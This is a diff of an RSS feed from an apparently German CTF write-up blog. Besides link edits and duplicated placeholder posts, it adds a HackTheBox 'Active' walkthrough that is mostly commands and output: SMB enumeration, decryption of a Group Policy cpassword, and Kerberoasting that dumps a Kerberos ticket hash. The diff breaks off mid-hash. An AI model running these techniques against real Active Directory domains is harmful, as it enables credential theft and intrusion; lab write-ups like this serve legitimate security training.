@@ -1,20 +1,20 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>Posts on Maximilian Hildebrand</title>
-        <link>https://www.m10x.de/posts/</link>
+        <link>/posts/</link>
         <description>Recent content in Posts on Maximilian Hildebrand</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
         <lastBuildDate>Wed, 05 Dec 2018 16:00:56 +0100</lastBuildDate>
-        <atom:link href="https://www.m10x.de/posts/index.xml" rel="self" type="application/rss+xml" />
+        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
         
         <item>
             <title>HackTheBox - Kotarak WriteUp | Tipps &#43; Anleitung</title>
-            <link>https://www.m10x.de/posts/2018/12/hackthebox-kotarak-writeup-tipps-anleitung/</link>
+            <link>/posts/2018/12/hackthebox-kotarak-writeup-tipps-anleitung/</link>
             <pubDate>Wed, 05 Dec 2018 16:00:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2018/12/hackthebox-kotarak-writeup-tipps-anleitung/</guid>
+            <guid>/posts/2018/12/hackthebox-kotarak-writeup-tipps-anleitung/</guid>
             <description>Kotarak ist eine der sehr schwierigen CTF Challenges von HackTheBox.
 Tipps Wir müssen auf eine Webseite zugreifen, auf welche wir keinen Zugriff von außen haben, allerdings von einer anderen Webseite aus!
 Ein Teil von Kotarak wird auch in der HackTheBox Maschine Jerry behandelt, allerdings brauchen wir erstmal das Tomcat Admin Passwort
@@ -554,10 +554,10 @@ Fie was served. Check on /root/hacked-via-wget on the victim<span style="color:#
         
         <item>
             <title>HackTheBox - Node WriteUp | Tipps &#43; Anleitung</title>
-            <link>https://www.m10x.de/posts/2018/03/hackthebox-node-writeup-tipps-anleitung/</link>
+            <link>/posts/2018/03/hackthebox-node-writeup-tipps-anleitung/</link>
             <pubDate>Fri, 09 Mar 2018 12:10:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2018/03/hackthebox-node-writeup-tipps-anleitung/</guid>
+            <guid>/posts/2018/03/hackthebox-node-writeup-tipps-anleitung/</guid>
             <description>Node ist eine der schwierigeren CTF Challenges von HackTheBox. Grundlegendes Wissen im Bereich Reverse Engineering und Datenbanken wird benötigt.
 
 Tipps  Sieh dir den Seitenquelltext genau an. Wenn der Download abbricht, versuche einen anderen Browser, benutze Burp als Proxy oder kopiere den Seitenquelltext. ltrace (zum debuggen) und radare2 (zur Analyse des Assembly Codes) können dich an&amp;rsquo;s Ziel bringen. Um an /root/root.txt zu kommen gibt es 3 verschiedene Methoden.  Video</description>
@@ -1081,10 +1081,10 @@ e11#########ZENSIERT#########1b1
         
         <item>
             <title>HackTheBox - Mantis WriteUp | Tipps &#43; Anleitung</title>
-            <link>https://www.m10x.de/posts/2018/02/hackthebox-mantis-writeup-tipps-anleitung/</link>
+            <link>/posts/2018/02/hackthebox-mantis-writeup-tipps-anleitung/</link>
             <pubDate>Mon, 26 Feb 2018 15:28:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2018/02/hackthebox-mantis-writeup-tipps-anleitung/</guid>
+            <guid>/posts/2018/02/hackthebox-mantis-writeup-tipps-anleitung/</guid>
             <description>Mantis ist eine der schwierigeren CTF Challenges von HackTheBox. Allerdings ist die Mantis relativ einfach, wenn man weiß, was man macht.
 
 Tipps  Port 8080 ist nicht der richtige HTTP Port. Außerdem sollte eine größere Wörterliste für das Directory Bruteforcing benutzt werden. Um an User und Root zu kommen, musst du einen Exploit für die kritische Kerberos Schwachstelle MS14-068 benutzen. GoldenPac.py von Impacket, kann es dir einfacher machen.  Video</description>
@@ -1335,10 +1335,10 @@ C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>
         
         <item>
             <title>HackTheBox - Shocker WriteUp | Tipps &#43; Anleitung</title>
-            <link>https://www.m10x.de/posts/2018/02/hackthebox-shocker-writeup-tipps-anleitung/</link>
+            <link>/posts/2018/02/hackthebox-shocker-writeup-tipps-anleitung/</link>
             <pubDate>Tue, 20 Feb 2018 16:41:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2018/02/hackthebox-shocker-writeup-tipps-anleitung/</guid>
+            <guid>/posts/2018/02/hackthebox-shocker-writeup-tipps-anleitung/</guid>
             <description>HackTheBox - Shocker WriteUp | Tipps + Anleitung | htb Shocker ist eine der vielen Verfügbaren CTF Challenges von HackTheBox. Shocker ist eine leichte bis mittelschwere Maschine von HackTheBox.
 
 Tipps Der Webserver hat ein interessantes Verzeichnis mit einer Datei drin.
@@ -1471,10 +1471,10 @@ root
         
         <item>
             <title>OverTheWire Natas WriteUp - Level 0 bis 14</title>
-            <link>https://www.m10x.de/posts/2018/02/overthewire-natas-writeup-level-0-bis-14/</link>
+            <link>/posts/2018/02/overthewire-natas-writeup-level-0-bis-14/</link>
             <pubDate>Tue, 13 Feb 2018 21:27:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2018/02/overthewire-natas-writeup-level-0-bis-14/</guid>
+            <guid>/posts/2018/02/overthewire-natas-writeup-level-0-bis-14/</guid>
             <description>Einleitung Wargames OverTheWire.org bietet über 15 verschiedene Wargames an, welche verschiedene Schwierigskeitgrade haben. Wenn du den Begriff &amp;ldquo;Wargame&amp;rdquo; im Bezug zu Cyber Security zum ersten Mal hörst, fragst du dich bestimmt: &amp;ldquo;Was ist eigentlich ein Wargame?&amp;rdquo;.
 Wargames sind Herausforderungen, entweder online oder offline als Virtuelle Maschine, in denen man versucht Sicherheitslücken auszunutzen und/oder Zugriff zu etwas zu erlangen. Sie sind teilweise sehr unterschiedlich was die benötigten Fähigkeiten, die Herausforderung und die Vorgehensweise anbelangt.</description>
             <content type="html"><![CDATA[<h2 id="einleitung-wargames"><strong>Einleitung Wargames</strong></h2>
@@ -1984,10 +1984,10 @@ bcdghkmnqrswAGHNPQSW357890
         
         <item>
             <title>OverTheWire Bandit WriteUp - Alle Level</title>
-            <link>https://www.m10x.de/posts/2018/02/overthewire-bandit-writeup-alle-level/</link>
+            <link>/posts/2018/02/overthewire-bandit-writeup-alle-level/</link>
             <pubDate>Tue, 13 Feb 2018 20:38:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2018/02/overthewire-bandit-writeup-alle-level/</guid>
+            <guid>/posts/2018/02/overthewire-bandit-writeup-alle-level/</guid>
             <description>Einleitung Wargames OverTheWire.org bietet über 15 verschiedene Wargames an, welche verschiedene Schwierigskeitgrade haben. Wenn du den Begriff &amp;ldquo;Wargame&amp;rdquo; im Bezug zu Cyber Security zum ersten Mal hörst, fragst du dich bestimmt: &amp;ldquo;Was ist eigentlich ein Wargame?&amp;rdquo;.
 Wargames sind Herausforderungen, entweder online oder offline als Virtuelle Maschine, in denen man versucht Sicherheitslücken auszunutzen und/oder Zugriff zu etwas zu erlangen. Sie sind teilweise sehr unterschiedlich was die benötigten Fähigkeiten, die Herausforderung und die Vorgehensweise anbelangt.</description>
             <content type="html"><![CDATA[<h2 id="einleitung-wargames"><strong>Einleitung Wargames</strong></h2>
@@ -2888,10 +2888,10 @@ If you have an idea <span style="color:#66d9ef">for</span> an awesome new level,
         
         <item>
             <title>HackTheBox - Mirai WriteUp | Tipps &#43; Anleitung</title>
-            <link>https://www.m10x.de/posts/2018/02/hackthebox-mirai-writeup-tipps-anleitung/</link>
+            <link>/posts/2018/02/hackthebox-mirai-writeup-tipps-anleitung/</link>
             <pubDate>Sat, 10 Feb 2018 19:59:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2018/02/hackthebox-mirai-writeup-tipps-anleitung/</guid>
+            <guid>/posts/2018/02/hackthebox-mirai-writeup-tipps-anleitung/</guid>
             <description>Mirai ist eine der vielen Verfügbaren CTF Challenges von HackTheBox. Mirai ist eine leichte Maschine von HackTheBox und sehr gut für Anfänger geeignet. Aber auch für Erfahrene, die eine Herausforderung für zwischendurch suchen.
 
 Tipps  Informiere dich darüber, wie das Mirai-Botnetz sich ausgebreitet hat. Welches Betriebssystem hat die Maschine? Auf was für einem Gerät läuft dieses?
@@ -2990,10 +2990,10 @@ root@raspberrypi:/dev# cat sdb
         
         <item>
             <title>HackTheBox - SolidState WriteUp | Tipps &#43; Anleitung</title>
-            <link>https://www.m10x.de/posts/2018/01/hackthebox-solidstate-writeup-tipps-anleitung/</link>
+            <link>/posts/2018/01/hackthebox-solidstate-writeup-tipps-anleitung/</link>
             <pubDate>Sat, 27 Jan 2018 20:00:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2018/01/hackthebox-solidstate-writeup-tipps-anleitung/</guid>
+            <guid>/posts/2018/01/hackthebox-solidstate-writeup-tipps-anleitung/</guid>
             <description>SolidState ist eine der vielen Verfügbaren CTF Challenges von HackTheBox. SolidState ist eine leichte bis mittelschwere Maschine von HackTheBox.
 
 Tipps  Scanne mit Nmap alle Ports. Informiere dich was JAMES ist. Außerdem ist Telnet dein Freund. Um nicht eine eingeschränkte Bash-Shell (rbash) zu haben, musst du einen JAMES Exploit benutzen. Benutze LinEnum.sh mit der Option -t. Sieh dir bei den LinEnum Ergebnis World-writable files genau an.  Video</description>
@@ -3168,10 +3168,10 @@ b4c#########ZENSIERT#########7c9
         
         <item>
             <title>HackThis - Alle Main Level Walkthrough | Tipps &#43; Anleitung</title>
-            <link>https://www.m10x.de/posts/2018/01/hackthis-alle-main-level-walkthrough-tipps-anleitung/</link>
+            <link>/posts/2018/01/hackthis-alle-main-level-walkthrough-tipps-anleitung/</link>
             <pubDate>Tue, 23 Jan 2018 20:39:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2018/01/hackthis-alle-main-level-walkthrough-tipps-anleitung/</guid>
+            <guid>/posts/2018/01/hackthis-alle-main-level-walkthrough-tipps-anleitung/</guid>
             <description>Walkthrough | Tipps + Anleitung zu allen Main Levels 1-10 von HackThis. Die Main Level gehören zu dein einfacheren von HackThis.
 Video 
 Level 1 Drücke Strg + u um den Quelltext der Seite anzuzeigen. Achte auf Kommentare im Quelltext.
@@ -3274,10 +3274,10 @@ Vielen Dank für&rsquo;s lesen.</p>
         
         <item>
             <title>HackTheBox - Blue WriteUp | Tipps &#43; Anleitung</title>
-            <link>https://www.m10x.de/posts/2018/01/hackthebox-blue-writeup-tipps-anleitung/</link>
+            <link>/posts/2018/01/hackthebox-blue-writeup-tipps-anleitung/</link>
             <pubDate>Sat, 13 Jan 2018 20:00:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2018/01/hackthebox-blue-writeup-tipps-anleitung/</guid>
+            <guid>/posts/2018/01/hackthebox-blue-writeup-tipps-anleitung/</guid>
             <description>Blue ist eine der vielen Verfügbaren CTF Challenges von HackTheBox. Blue gehört zu den einfacheren Maschinen von HackTheBox und ist deswegen sehr gut für Anfänger geeignet. Aber auch für Erfahrene, die eine Herausforderung für zwischendurch suchen.
 
 Tipps  nmap -A zeigt uns deutlich auf welchen Port wir achten müssen Der Name der Maschine, Blue, ist ein Tipp Wenn wir wissen was die Schwachstelle ist, ist Metasploit unser Freund. Wenn der Exploit fehlschlagen sollte, überprüfe deine Einstellungen und versuche es noch ein paar Mal.</description>
@@ -3499,10 +3499,10 @@ type root.txt
         
         <item>
             <title>HackTheBox - Blocky WriteUp | Tipps &#43; Anleitung</title>
-            <link>https://www.m10x.de/posts/2017/12/hackthebox-blocky-writeup-tipps-anleitung/</link>
+            <link>/posts/2017/12/hackthebox-blocky-writeup-tipps-anleitung/</link>
             <pubDate>Thu, 21 Dec 2017 21:45:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2017/12/hackthebox-blocky-writeup-tipps-anleitung/</guid>
+            <guid>/posts/2017/12/hackthebox-blocky-writeup-tipps-anleitung/</guid>
             <description>Blocky ist eine der vielen Verfügbaren CTF Challenges auf HackTheBox. Blocky gehört zu den einfacheren Maschinen von HackTheBox und ist deswegen sehr gut für Anfänger geeignet. Aber auch für Erfahrene, die eine Herausforderung für zwischendurch suchen.
 
 Tipps  Welche Verzeichnisse kannst du finden? Eventuell eins, welches mit Plugins zu tun hat? Man sollte nie Passwörter mehrmals verwenden&amp;hellip;  Anleitung Zuerst machen wir wie gewohnt einen Nmap-Scan um herauszufinden welche Ports offen sind.</description>
@@ -3674,10 +3674,10 @@ root.txt
         
         <item>
             <title>HackTheBox Invite Code WriteUp | Tipps &#43; Anleitung</title>
-            <link>https://www.m10x.de/posts/2017/12/hackthebox-invite-code-writeup-tipps-anleitung/</link>
+            <link>/posts/2017/12/hackthebox-invite-code-writeup-tipps-anleitung/</link>
             <pubDate>Tue, 19 Dec 2017 20:32:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2017/12/hackthebox-invite-code-writeup-tipps-anleitung/</guid>
+            <guid>/posts/2017/12/hackthebox-invite-code-writeup-tipps-anleitung/</guid>
             <description>Tipps und Anleitung dazu, wie man an den Registrierungs Code für HackTheBox kommt.
 Dieser Eintrag ist mit mehreren Spoiler versehen, damit du den nächsten Schritt erstmal selber ausprobieren kannst.
 Einleitung HackTheBox ist eine online Plattform bei der man seine IT-Sicherheit und Penetration Test Fähigkeiten anwenden, testen und verbessern kann.
@@ -3739,11 +3739,385 @@ Versuchen wir mal unser Glück.</p>
         </item>
         
         <item>
-            <title>HackTheBox - Celestial</title>
-            <link>https://www.m10x.de/posts/2010/01/hackthebox-celestial/</link>
+            <title>First post</title>
+            <link>/posts/2010/01/first-post/</link>
             <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2010/01/hackthebox-celestial/</guid>
+            <guid>/posts/2010/01/first-post/</guid>
+            <description></description>
+            <content type="html"><![CDATA[<p><a href="http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE"><img src="http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>First post</title>
+            <link>/posts/2010/01/first-post/</link>
+            <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
+            
+            <guid>/posts/2010/01/first-post/</guid>
+            <description></description>
+            <content type="html"><![CDATA[<p><a href="http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE"><img src="http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HackTheBox - Active</title>
+            <link>/posts/2010/01/hackthebox-active/</link>
+            <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
+            
+            <guid>/posts/2010/01/hackthebox-active/</guid>
+            <description>https://github.com/SecureAuthCorp/impacket
+https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py
+root@kali:~/active# nmap -sV -sC 10.10.10.100
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-07 10:11 CET
+Nmap scan report for 10.10.10.100
+Host is up (0.022s latency).
+Not shown: 983 closed ports
+PORT STATE SERVICE VERSION
+53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid:
+|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2018-12-07 09:12:05Z)
+135/tcp open msrpc Microsoft Windows RPC</description>
+            <content type="html"><![CDATA[<p><a href="http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE"><img src="http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
+<p><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+<p><a href="https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py">https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py</a></p>
+<p>root@kali:~/active# nmap -sV -sC 10.10.10.100<br>
+Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2018-12-07 10:11 CET<br>
+Nmap scan report for 10.10.10.100<br>
+Host is up (0.022s latency).<br>
+Not shown: 983 closed ports<br>
+PORT STATE SERVICE VERSION<br>
+53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)<br>
+| dns-nsid:<br>
+|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)<br>
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2018-12-07 09:12:05Z)<br>
+135/tcp open msrpc Microsoft Windows RPC<br>
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn<br>
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)<br>
+445/tcp open microsoft-ds?<br>
+464/tcp open kpasswd5?<br>
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0<br>
+636/tcp open tcpwrapped<br>
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)<br>
+3269/tcp open tcpwrapped<br>
+49152/tcp open msrpc Microsoft Windows RPC<br>
+49153/tcp open msrpc Microsoft Windows RPC<br>
+49154/tcp open msrpc Microsoft Windows RPC<br>
+49155/tcp open msrpc Microsoft Windows RPC<br>
+49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0<br>
+49158/tcp open msrpc Microsoft Windows RPC<br>
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</p>
+<p>Host script results:<br>
+| smb2-security-mode:<br>
+| 2.02:<br>
+|_ Message signing enabled and required<br>
+| smb2-time:<br>
+| date: 2018-12-07 10:13:01<br>
+|_ start_date: 2018-12-07 09:42:16</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>
+Nmap done: 1 IP address (1 host up) scanned in 151.38 seconds</p>
+<p>root@kali:~/active# python smbclient.py 10.10.10.100<br>
+Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation</p>
+<p>Type help for list of commands</p>
+<h1 id="shares">shares</h1>
+<p>ADMIN$<br>
+C$<br>
+IPC$<br>
+NETLOGON<br>
+Replication<br>
+SYSVOL<br>
+Users</p>
+<h1 id="use-replication">use Replication</h1>
+<h1 id="ls">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 active.htb</p>
+<h1 id="cd-activehtb">cd active.htb</h1>
+<h1 id="ls-1">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 DfsrPrivate<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 Policies<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 scripts</p>
+<h1 id="cd-policies">cd Policies</h1>
+<h1 id="ls-2">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 {31B2F340-016D-11D2-945F-00C04FB984F9}<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 {6AC1786C-016F-11D2-945F-00C04fB984F9}</p>
+<h1 id="cd-31b2f340-016d-11d2-945f-00c04fb984f9">cd {31B2F340-016D-11D2-945F-00C04FB984F9}</h1>
+<h1 id="ls-3">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..<br>
+-rw-rw-rw- 23 Sat Jul 21 12:38:11 2018 GPT.INI<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 Group Policy<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 MACHINE<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 USER</p>
+<h1 id="cd-machine">cd machine</h1>
+<h1 id="ls-4">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 Microsoft<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 Preferences<br>
+-rw-rw-rw- 2788 Sat Jul 21 12:38:11 2018 Registry.pol</p>
+<h1 id="cd-preferences">cd Preferences</h1>
+<h1 id="ls-5">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 Groups</p>
+<h1 id="cd-groups">cd Groups</h1>
+<h1 id="ls-6">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..<br>
+-rw-rw-rw- 533 Sat Jul 21 12:38:11 2018 Groups.xml</p>
+<h1 id="get-groupsxml">get Groups.xml</h1>
+<h1 id="exit">exit</h1>
+<p>root@kali:~/active# cat Groups.xml</p>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->&lt;Properties action=&ldquo;U&rdquo; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&ldquo;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&rdquo; changeLogon=&ldquo;0&rdquo; noChange=&ldquo;1&rdquo; neverExpires=$<br>
+1&quot; acctDisabled=&ldquo;0&rdquo; userName=&ldquo;active.htb\SVC_TGS&rdquo;/&gt;<!-- raw HTML omitted --><br>
+<!-- raw HTML omitted --></p>
+<p>root@kali:~/active# python gpprefdecrypt.py edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ<br>
+GPPstillStandingStrong2k18<br>
+root@kali:~/active# python smbclient.py SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100<br>
+Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation</p>
+<p>Type help for list of commands</p>
+<h1 id="shares-1">shares</h1>
+<p>ADMIN$<br>
+C$<br>
+IPC$<br>
+NETLOGON<br>
+Replication<br>
+SYSVOL<br>
+Users</p>
+<h1 id="use-users">use users</h1>
+<h1 id="ls-7">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 16:39:20 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 16:39:20 2018 ..<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:21 2018 Administrator<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:56 2018 All Users<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:47 2018 Default<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:56 2018 Default User<br>
+-rw-rw-rw- 174 Mon Jul 16 23:01:17 2018 desktop.ini<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:47 2018 Public<br>
+drw-rw-rw- 0 Sat Jul 21 17:16:32 2018 SVC_TGS</p>
+<h1 id="cd-svc_tgs">cd SVC_TGS</h1>
+<h1 id="ls-8">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 17:16:32 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 17:16:32 2018 ..<br>
+drw-rw-rw- 0 Sat Jul 21 17:14:20 2018 Contacts<br>
+drw-rw-rw- 0 Sat Jul 21 17:14:42 2018 Desktop<br>
+drw-rw-rw- 0 Sat Jul 21 17:14:28 2018 Downloads<br>
+drw-rw-rw- 0 Sat Jul 21 17:14:50 2018 Favorites<br>
+drw-rw-rw- 0 Sat Jul 21 17:15:00 2018 Links<br>
+drw-rw-rw- 0 Sat Jul 21 17:15:23 2018 My Documents<br>
+drw-rw-rw- 0 Sat Jul 21 17:15:40 2018 My Music<br>
+drw-rw-rw- 0 Sat Jul 21 17:15:50 2018 My Pictures<br>
+drw-rw-rw- 0 Sat Jul 21 17:16:05 2018 My Videos<br>
+drw-rw-rw- 0 Sat Jul 21 17:16:20 2018 Saved Games<br>
+drw-rw-rw- 0 Sat Jul 21 17:16:32 2018 Searches</p>
+<h1 id="cd-desktop">cd Desktop</h1>
+<h1 id="ls-9">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 17:14:42 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 17:14:42 2018 ..<br>
+-rw-rw-rw- 34 Sat Jul 21 17:14:42 2018 user.txt</p>
+<h1 id="get-usertxt">get user.txt</h1>
+<h1 id="exit-1">exit</h1>
+<p>root@kali:~/active# cat user.txt<br>
+86d#########ZENSIERT#########983</p>
+<p>root@kali:~/active# python GetUserSPNs.py -dc-ip 10.10.10.100 -request active.htb/SVC_TGS:GPPstillStandingStrong2k18<br>
+Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation</p>
+<p>ServicePrincipalName Name MemberOf PasswordLastSet LastLogon</p>
+<hr>
+<p>active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 21:06:40 2018-07-30 19:17:40</p>
+<p>$krb5tgs$23$<em>Administrator$ACTIVE.HTB$active/CIFS~445</em>$10589d87c1a98b404545a09ac0edbec8$9470373fe8ddd05e0cb35e6307ce19f2b782e291b568af5f62b6096dfb46dee03cd8add92816c256b21fc8c475acdf49e825e2f32a361bd4b94b9d56eb7<br>
+de54b8a728752c6f7e50ceb6024d388b4ba99ba4a02dd3975355f49f9184f1e6b7606f5554d5e45d28693a5aef90f0591d36567d0e8c641e16e7c8d05047b2d9d2040e5be0a37abcb7e0e106f0a98f5861f000506daef442270dba05d0a0b593a86cd2cfb231ed9a623<br>
+da2ec87bfd185a90c79baf2d05b9f6a0edd79c9a25a2087f22211dc99749099ac091fceab6647e6da19164dba1bd174df0bb0e3f82ba790f840b7b0d19fbc8d4e21077b9f7dc45cfc9e54ce9b788293c6d222504fdc995923ad940bdfc80da606708f0485b448a9e689<br>
+d165f07b1d5da0f249c5db85d98d54be7d3a985808cfee3bbeb3f875eb33e6b818ed5d2f699960280092ebf9506d0510bb3f23fd1d94ce0ee3cbd3066240ddeda67986a5b70334baea5dbd88743fb3ef843ea170ecd38469a5fa1dc957566579ea25ec3c81f0e8dbaa6<br>
+8e0c203409ebedd098cc928cab4632c401d7c5a64cc997ed3ec6e87b37b44d5dc349c25edf41623df54cde4cc356fe1023ac62684a9278bf0756d46634eb1a0379d614dd78488293b8e7a7e770ac078afdc6b60f0edd4c336557a6791c398126c61c9e546894e29d5d7<br>
+ae3111e13fbdd4c7b68be0d7e71520d3f7f1ec6826fe24683a7c9c32a16c28221ebd8b4fe61a189cfce3d2115d9840aa9e3d77a46077d05a6cca034a81117f1240fc21c9ccaba16c5bed6815a8338b75dc293b193f45b8354e0f5aa2acad7c1606bd5d30651e9661663<br>
+211b1e11c07073c9d932e157073fd8940055a1fb2c03260af72a521c9f633412b3d1bf9e9e21b755a92d812a1e6061dff7c0564286a0c897e6be885a8fdb8b48c6314ed2d118d504675b9935f65eafecd69f57894fdee85a32950f9ef8f21c5f6010019837d1fa1cd68<br>
+8161cf02a9e6eb47041a83258353fb2fdd434a20de6362cb17f42b44b53f4f7b6ecd83d1b4c23698562a1ebe5b306bc6154aaaf3668738fb72078e90ad4ce5c72cd6f92df6d6747d6fcd7d23b9616a9fdbdd4312a25960102dc9b6985128e77fc7b6227bf27248efe90<br>
+f6637e0b98bb4a72e6e452b80931649dec99bf2e8fa3c418889a6d83576110f1ad655f3e67c798b724e7b8ae1512b32ab4dbb5e46f1fd278124ba952467ec27014f0ea8e88346db8949b6c606fc9d7081ad03b85d7fa15b96a60<br>
+root@kali:~/active# echo &lsquo;$krb5tgs$23$<em>Administrator$ACTIVE.HTB$active/CIFS~445</em>$10589d87c1a98b404545a09ac0edbec8$9470373fe8ddd05e0cb35e6307ce19f2b782e291b568af5f62b6096dfb46dee03cd8add92816c256b21fc8c475acdf49e<br>
+825e2f32a361bd4b94b9d56eb7de54b8a728752c6f7e50ceb6024d388b4ba99ba4a02dd3975355f49f9184f1e6b7606f5554d5e45d28693a5aef90f0591d36567d0e8c641e16e7c8d05047b2d9d2040e5be0a37abcb7e0e106f0a98f5861f000506daef442270dba05d<br>
+0a0b593a86cd2cfb231ed9a623da2ec87bfd185a90c79baf2d05b9f6a0edd79c9a25a2087f22211dc99749099ac091fceab6647e6da19164dba1bd174df0bb0e3f82ba790f840b7b0d19fbc8d4e21077b9f7dc45cfc9e54ce9b788293c6d222504fdc995923ad940bdf<br>
+c80da606708f0485b448a9e689d165f07b1d5da0f249c5db85d98d54be7d3a985808cfee3bbeb3f875eb33e6b818ed5d2f699960280092ebf9506d0510bb3f23fd1d94ce0ee3cbd3066240ddeda67986a5b70334baea5dbd88743fb3ef843ea170ecd38469a5fa1dc95<br>
